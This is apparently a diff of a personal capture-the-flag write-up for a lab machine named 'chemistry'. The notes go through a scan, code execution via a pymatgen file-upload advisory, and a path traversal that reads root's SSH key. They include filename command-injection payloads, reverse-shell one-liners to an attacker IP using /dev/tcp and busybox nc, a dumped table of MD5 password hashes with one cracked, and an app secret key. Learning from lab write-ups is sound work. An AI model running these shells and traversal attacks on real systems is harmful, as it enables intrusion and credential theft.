@@ -3,6 +3,7 @@ ___
 ## Enumeration
 
 ## Port 80 - HTTP (Apache)
+```
 Warning: 10.10.11.38 giving up on port because retransmission cap hit (2).
 Nmap scan report for 10.10.11.38
 Host is up, received echo-reply ttl 63 (0.16s latency).
@@ -25,12 +26,14 @@ PORT     STATE SERVICE REASON         VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Read data files from: /usr/bin/../share/nmap
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-# Nmap done at Tue Jan 14 21:32:22 2025 -- 1 IP address (1 host up) scanned in 539.34 seconds
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ 
+```
 
 
 ---
 
+*Subdomain Fuzzing*
+```
 200      GET       29l       57w      926c http://10.10.11.38:5000/login
 200      GET       29l       57w      931c http://10.10.11.38:5000/register
 200      GET      126l      277w     2312c http://10.10.11.38:5000/static/styles.css
@@ -40,9 +43,11 @@ Service detection performed. Please report any incorrect results at https://nmap
 302      GET        5l       22w      235c http://10.10.11.38:5000/dashboard => http://10.10.11.38:5000/login?next=%2Fdashboard
 [####################] - 3m     30004/30004   0s      found:7       errors:0      
 [####################] - 3m     30000/30000   192/s   http://10.10.11.38:5000/    
+```
 
 
-# maybe the backend is using some python like this (passing file to library)
+
+*maybe the backed is using python like this (passing file to library)*
 ```java
 from pymatgen import Structure
 ges_structure = Structure.from_file("GeS.cif")
@@ -50,23 +55,25 @@ ges_structure.to(filename="GeS.json")
 ```
 
 Tried uploading file name this:
-
+```
  'test.cif");import time;time.sleep(10000000)#.cif'
+```
 
-file name got cleaned to this:
-
+File name got cleaned to this:
+```
 test.cifimport_timetime.sleep10000000.cif
+```
 
 
-# characters being cleaned from input:
-
+Characters being cleaned from input:
+```
 " (  )  ; #
+```
 space replaced with _
 
 
-try to ping  my machine with the command and see what happens;
+Try to ping  my machine with the command and see what happens;
 when attempting to see the file I am getting internal server error
-
 
 Things to check:
 check what characters i can put in file name
@@ -78,11 +85,12 @@ https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-
 this works!!! for executing shell commands, i can ping my machine but shell 
 causes server error
 
-# getting shell to work
+# Getting shell to work
 
 shit was so mid this shell worked:  (it was crashing out cause of - char i think?)
-
+```
 0<&196;exec 196<>/dev/tcp/10.10.14.32/443; sh <&196 >&196 2>&196
+```
 
 maybe filtering for it??
 
@@ -93,7 +101,7 @@ busybox nc 10.10.14.32 4444 -e /bin/bash
 this shell works (fr this time) bruh
 
 
-# found creds inside app.py for database
+# Found creds inside app.py for database
 
 app = Flask(__name__)
 app.config['SECRET_KEY'] = 'MyS3cretCh3mistry4PP'
@@ -105,17 +113,18 @@ There is a www-data-user
 also 
 127.0.0.1:8080 running on localhost
 
-# this file looks interesting:
+
+# This file looks interesting:
 -rw-r--r-- 1 rosa rosa 0 Jun 15  2024 /home/rosa/.sudo_as_admin_successful
 
 
-# hosts file
+# Hosts file
 chemistry
 127.0.0.1 localhost
 127.0.1.1 chemistry
 
 
-# sqlite database users table
+# Sqlite database users table
 
 sqlite> select * from user; 
 1|admin|2861debaf8d99436a10ed6f75a252abf
@@ -135,16 +144,14 @@ sqlite> select * from user;
 15|q|7694f4a66316e53c8cdd9d9954bd611d
 
 
-# threw rose hash in crackstation.com
-
+# Threw rose hash in crackstation.com
 | hash                             | type | pass              |
 | -------------------------------- | ---- | ----------------- |
 | 63ed86ee9f624c7b14f1d4f43dc251a5 | md5  | unicorniosrosados |
-|                                  |      |                   |
-|                                  |      |                   |
-
 unicorniosrosados
-# rosa user notes
+
+
+# Rosa user notes
 
 This interesting:
 -rw-r--r-- 1 rosa rosa 0 Jun 15  2024 /home/rosa/.sudo_as_admin_successful
@@ -154,7 +161,8 @@ also website running in port 8080 accessible by rosa
 #expose_website_on_public_ip
 ssh -L 10.10.14.38:8080:localhost:8080 user@localhost
 
-# looking at script.js file in website
+
+# Looking at script.js file in website
 you can see directory /list_services which is returning json to be displayed in the site
 
 looking at response headers you can see :
@@ -166,11 +174,12 @@ A proof of concept of the path traversal vulnerability in the python AioHTTP lib
 
 https://github.com/z3rObyte/CVE-2024-23334-PoC
 
-# this works !!!! 
+
+# This works !!!! 
 # note: the static directory is name /assets so that needs to be modified in the script
 
 
 since the script is running as root to list processes running on machine we can read the /root/.ssh/id_rsa private key ssh file 
 
-# now have root! that it
+# Now have root! That's it.
 
